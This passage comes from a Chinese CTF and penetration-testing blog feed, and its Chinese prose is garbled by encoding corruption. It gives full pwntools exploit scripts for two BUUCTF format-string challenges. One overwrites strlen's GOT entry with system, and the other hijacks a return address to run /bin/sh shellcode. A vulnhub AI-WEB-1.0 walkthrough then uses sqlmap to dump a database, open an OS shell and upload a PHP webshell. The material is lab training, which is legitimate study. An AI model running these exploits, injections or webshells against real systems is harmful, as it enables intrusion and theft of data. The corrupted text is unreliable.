<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br></pre></td></tr></table></figure>

<p>â€‹	æ‰“å°å‡ºæ¥ä»–ä»¬çš„åœ°å€ï¼Œå‘ç°åªæœ‰å<code>3</code>ä¸ªå­—èŠ‚ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹å<code>3</code>ä¸ªå­—èŠ‚å³å¯</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932156.png" alt="image-20240130193456108"></p>
<p>â€‹	åŒ<code>32</code>ä½ï¼Œåˆ†åˆ«è¡¨ç¤ºå‡ºè¿™<code>3</code>ä¸ªå­—èŠ‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr3))  </span><br><span class="line"><span class="comment">#9æ˜¯è¾“å‡ºçš„â€œRepeater:â€çš„å­—ç¬¦æ•°</span></span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br></pre></td></tr></table></figure>

<p>â€‹	æ„é€ ç¬¬äºŒä¸ª<code>payload</code>çš„æ—¶å€™åŒæ ·ä¸èƒ½å’Œ<code>32</code>ä½çš„é¢˜ä¸€æ ·äº†ï¼Œ<code>payload2 = b&#39;%&#39;+bytes(str(sysaddr1_value),encoding=&#39;utf-8&#39;)+b&#39;c&#39;+b&#39;%13$hhn&#39; </code>çš„æ„æ€æ˜¯å°†<code>sys_addr1_value</code>çš„å€¼ä½œä¸ºå­—ç¬¦å†™å…¥åˆ°ç¬¬<code>13</code>ä¸ªå‚æ•°æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸­ï¼Œ<code>%hhn</code>æ˜¯åªä¿®æ”¹<code>1</code>ä¸ªå­—ç¬¦çš„æ„æ€ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line"><span class="comment">#å°†ä¼šä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†sysaddr1_valueçš„å€¼ä½œä¸ºå­—ç¬¦å†™å…¥åˆ°ç¬¬13ä¸ªå‚æ•°æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€ä¸­ã€‚</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#æ„æ€æ˜¯æŠŠpayloadå¡«å……åˆ°8çš„æ•´æ•°å€ï¼Œç”±äºæ˜¯64ä½çš„æ ˆä¸Šçš„åœ°å€æˆ–è€…æ•°æ®éƒ½æ˜¯8ä¸ªå­—èŠ‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´8ä¸ªå­—èŠ‚å ä¸€ä¸ªå‚æ•°ä½ï¼Œè¿™é‡Œæ˜¯5å€ä¹Ÿå°±æ˜¯5ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°çš„åç§»é‡æ˜¯8ï¼Œ9ï¼Œ10ï¼Œ11ï¼Œ12</span></span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#          ç¬¬13ä¸ªå‚æ•°         ç¬¬14ä¸ªå‚æ•°          ç¬¬15ä¸ªå‚æ•°</span></span><br><span class="line"><span class="comment">#ç»¼ä¸Šæ‰€è¿°ï¼Œå½“å¯¹ç›®æ ‡åœ°å€åŠ ä¸€ï¼ˆè¿›è¡Œåç§»ï¼‰æ—¶ï¼Œè¯»å–åˆ°çš„çœŸå®åœ°å€å°±ä¹Ÿåœ¨å˜åŒ–ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šçœŸå®åœ°å€çš„æ¯ä¸€ä½æ‰€åœ¨çš„ä½ç½®äº†</span></span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./fmt64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26762</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))  </span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932713.png" alt="image-20240130195341584"></p>
<h2 id="hitcontraining-playfmtï¼ˆebpé“¾ï¼‰"><a href="#hitcontraining-playfmtï¼ˆebpé“¾ï¼‰" class="headerlink" title="hitcontraining_playfmtï¼ˆebpé“¾ï¼‰"></a><code>hitcontraining_playfmt</code>ï¼ˆ<code>ebp</code>é“¾ï¼‰</h2><h3 id="ä¿æŠ¤-æºç "><a href="#ä¿æŠ¤-æºç " class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h3><p>â€‹	æŸ¥çœ‹ä¿æŠ¤ï¼Œ<code>32</code>ä½ç¨‹åºï¼Œæœ‰<code>RWX</code>æ®µæˆ‘ä»¬ç¬¬ä¸€æ—¶é—´æƒ³åˆ°ç”¨<code>shellcode</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932093.png" alt="image-20240209202319987"></p>
<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_fmt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	åˆ†æä»£ç ï¼Œ<code>printf(buf)</code>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ<code>buf</code>åœ¨<code>.bss</code>æ®µã€‚å¤§æ¦‚æ€è·¯å°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹å‡½æ•°è¿”å›åœ°å€ä¸º<code>buf</code>çš„èµ·å§‹åœ°å€<code>+4</code>ï¼ˆå› ä¸ºæ‰§è¡Œ<code>ret</code>æŒ‡ä»¤å°±éœ€è¦è·³å‡ºå¾ªç¯ï¼Œå°±éœ€è¦<code>buf</code>çš„å‰<code>4</code>ä¸ªå­—èŠ‚æ˜¯<code>quit</code>ï¼‰ï¼Œæœ€åå‘é€<code>shellcode</code>ã€‚</p>
<p>â€‹	ä¸‹å›¾ä¸­<code>ebp</code>ä¸‹é¢çš„<code>0xffffd07c</code>è¿™ä¸ªåœ°å€ä¸­æ”¾çš„æ˜¯å‡½æ•°è¿”å›åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ<code>0xffffd098</code>æ”¹æˆ<code>0xffffd07c</code>ï¼Œè¿™æ ·<code>0xffffd088 -&gt; 0xffffd098</code>å°±å˜æˆäº†<code>0xffffd088 -&gt; 0xffffd07c -&gt; 0x80485ad(play+77)</code>ï¼Œæˆ‘ä»¬ä¹Ÿå°±å¯ä»¥ä¿®æ”¹<code>0xffffd07c</code>ä¸­çš„å†…å®¹å³è¿”å›åœ°å€ä¸º<code>shellcode</code>çš„é¦–åœ°å€äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932681.png" alt="å±å¹•æˆªå›¾ 2024-02-09 202808"></p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28906</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Server&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%6$hhn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa064</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;quit&#x27;</span>+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932757.png" alt="image-20240209212128942"></p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€æµ‹è¯•é¶æœºvulnhub_AI-WEB-1.0é€šå…³è®°å½•</title>
    <url>/2024/11/19/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>æœ€è¿‘æƒ³æ‰“æ‰“é¶åœºï¼Œæ‰¾äº†å‡ ä¸ªå…¥é—¨é¶åœºæ¥æ¸—é€æµ‹è¯•äº†ä¸€ä¸‹ï¼Œvulnhubçš„AI-WEB-1.0è¿™ä¸ªæ˜¯æˆ‘æ‰“çš„ç¬¬ä¸€ä¸ªé¶æœºï¼Œæ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒé¡ºåˆ©çš„(æ¯•ç«Ÿæ˜¯å…¥é—¨çº§çš„)ã€‚</p>
<span id="more"></span>

<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="æ‰«æä¸»æœº"><a href="#æ‰«æä¸»æœº" class="headerlink" title="æ‰«æä¸»æœº"></a>æ‰«æä¸»æœº</h3><p>ä½¿ç”¨<code>netdiscover</code>å‘ç°ä¸»æœº</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.30.0/24</span><br><span class="line"><span class="comment"># eth0æ˜¯ç½‘å¡è®¾å¤‡å</span></span><br><span class="line"><span class="comment"># æ‰«æ192.168.30.0/24è¿™ä¸ªç½‘æ®µï¼Œæ£€æŸ¥åœ¨çº¿ä¸»æœº</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246262.png" alt="image-20241119153806356" style="zoom: 50%;" />

<h3 id="æ‰«æç«¯å£"><a href="#æ‰«æç«¯å£" class="headerlink" title="æ‰«æç«¯å£"></a>æ‰«æç«¯å£</h3><p>ä½¿ç”¨<code>nmap</code>æ‰«æå­˜æ´»ä¸»æœºçš„ç«¯å£</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -n 192.168.30.132</span><br><span class="line">nmap -T4 -A 192.168.30.132</span><br></pre></td></tr></table></figure>

<p>åªå¾—åˆ°<code>80</code>ç«¯å£</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246056.png" alt="image-20241119154532963" style="zoom:50%;" />

<p>æµè§ˆå™¨è®¿é—®ä¸€ä¸‹<code>192.168.30.132:80</code>ï¼Œå¥½å§æœç„¶ä»€ä¹ˆéƒ½æ²¡æœ‰</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255136.png" alt="image-20241119154840588" style="zoom:50%;" />

<h3 id="æ‰«æç›®å½•"><a href="#æ‰«æç›®å½•" class="headerlink" title="æ‰«æç›®å½•"></a>æ‰«æç›®å½•</h3><p>ä½¿ç”¨<code>dirb</code>æ‰«æç›®å½•<br>å‚è€ƒï¼š<a href="https://www.cnblogs.com/xiaoyus/p/18418624">DIRBï¼šä¸€æ¬¾å¼ºå¤§çš„Webç›®å½•æ‰«æå·¥å…·ä½¿ç”¨æŒ‡å—</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.30.132 -o dirb.txt</span><br><span class="line"><span class="comment">#å‚æ•°: -o è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="comment">#æ‰«æ192.168.30.132ä¸»æœºä¸Šçš„æ‰€æœ‰ç›®å½•ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°dirb.txtä¸­</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255532.png" alt="image-20241119155905008" style="zoom:50%;" />

<p>ç›´æ¥è®¿é—®<code>url</code></p>
<p><code>http://192.168.30.132/server-status</code>ï¼Œæ— æƒé™</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255616.png" alt="image-20241119160259061" style="zoom:50%;" />

<p><code>http://192.168.30.132/robots.txt</code>ï¼Œå‘ç°ä¸¤ä¸ªç›®å½•</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255633.png" alt="image-20241119160218025" style="zoom:50%;" />

<p>è®¿é—®è¿™ä¸¤ä¸ªç›®å½•ï¼Œéƒ½æ˜¯æ— æƒé™ï¼Œä¸‹é¢å†ä½¿ç”¨<code>dirb</code>æ‰«æè¿™ä¸¤ä¸ªç›®å½•</p>
<p><code>/m3diNf0/</code>ç›®å½•ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255143.png" alt="image-20241119160816299" style="zoom: 67%;" />

<p>è®¿é—®<code>http://192.168.30.132/m3diNf0/info.php</code>ï¼Œæ˜¯<code>php</code>é…ç½®æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å‘ç°äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255301.png" alt="image-20241119161053952" style="zoom: 50%;" />

<p><code>/se3reTdir777/</code>ç›®å½•ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255354.png" alt="image-20241119161459503" style="zoom:67%;" />

<p>è®¿é—®<code>http://192.168.30.132/se3reTdir777/index.php</code>ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ª<code>sql</code>æ³¨å…¥æ¼æ´</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255478.png" alt="image-20241119195135072" style="zoom: 67%;" />

<p>è®¿é—®<code>http://192.168.30.132/se3reTdir777/uploads/</code>ï¼Œæ— æƒé™</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255614.png" alt="image-20241119195407387" style="zoom:50%;" />

<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a><code>sql</code>æ³¨å…¥</h3><p>å…ˆ<code>bp</code>æŠ“åŒ…ä¸€ä¸‹ï¼Œç¡®å®šæ˜¯<code>POST</code>ä¼ å‚å¹¶æ‰¾åˆ°æ³¨å…¥ç‚¹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255089.png" alt="image-20241119195241615" style="zoom:50%;" />

<p>ä½¿ç”¨<code>sqlmap</code>å·¥å…·è¿›è¡Œ<code>sql</code>æ³¨å…¥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=11&amp;Operation=Submit&quot;</span> --dbs</span><br><span class="line"><span class="comment">#åˆ—å‡ºå…¨éƒ¨æ•°æ®åº“</span></span><br><span class="line"><span class="comment">#aiweb1,information_schema</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255859.png" alt="image-20241119200926142" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables</span><br><span class="line"><span class="comment">#åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#user,systemUser</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255399.png" alt="image-20241119200941269" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns</span><br><span class="line"><span class="comment">#åˆ—å­—æ®µ</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns -dump</span><br><span class="line"><span class="comment">#å†åŠ ä¸€ä¸ªå‚æ•° -dump å¯ä»¥æŠŠå­—æ®µé‡Œçš„å†…å®¹ä¹Ÿåˆ—å‡ºæ¥ï¼Œæˆ–è€…ä¸åŠ --columnsï¼Œåªåˆ—å­—æ®µé‡Œçš„å†…å®¹</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255528.png" alt="image-20241119201916635" style="zoom:50%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D  aiweb1 -T systemUser -dump</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255163.png" alt="image-20241119202638863" style="zoom:50%;" />

<p>å°è¯•<code>--os-shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --os-shell</span><br><span class="line"><span class="comment">#/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255054.png" alt="image-20241119203738412" style="zoom:50%;" />

<p>ç¬¬ä¸€ä¸ªé€‰<code>4(PHP)</code>ï¼Œç¬¬äºŒä¸ªé€‰é¡¹é€‰<code>2</code>(è‡ªå®šä¹‰ç›®å½•ä½ç½®)ï¼Œè¿™é‡Œéœ€è¦æä¾›ç»å¯¹è·¯å¾„</p>
<p>â€‹	<strong>å‰é¢åœ¨<code>php</code>é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸º<code>/home/www/html/web1x443290o2sdf92213/</code>ï¼Œæ‰«æ<code>/se3reTdir777/</code>ç›®å½•æ—¶ï¼Œå‡ºç°äº†<code>/se3reTdir777/index.php</code>å’Œ<code>/se3reTdir777/uploads/</code>ä¸¤ä¸ªè·¯å¾„ï¼Œè®¿é—®è¿™ä¸¤ä¸ªè·¯å¾„éƒ½å­˜åœ¨<code>sql</code>æ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä¸¤ä¸ªè·¯å¾„éƒ½å°è¯•äº†ä¸€ä¸‹ï¼Œ<code>uploads/</code>è¿™ä¸ªå¯¹äº†ã€‚</strong></p>
<p>æ‹¿åˆ°<code>shell</code>ï¼Œä½†æ˜¯æƒé™è¾ƒä½æ˜¯<code>www-data</code></p>
<h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p><code>hack.php</code>ï¼Œæœ¬åœ°çš„ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255275.png" alt="image-20241119210831951"></p>
<p>ä½¿ç”¨<code>sqlmap</code>ä¸Šä¼ <code>hack.php</code>æ–‡ä»¶</p>
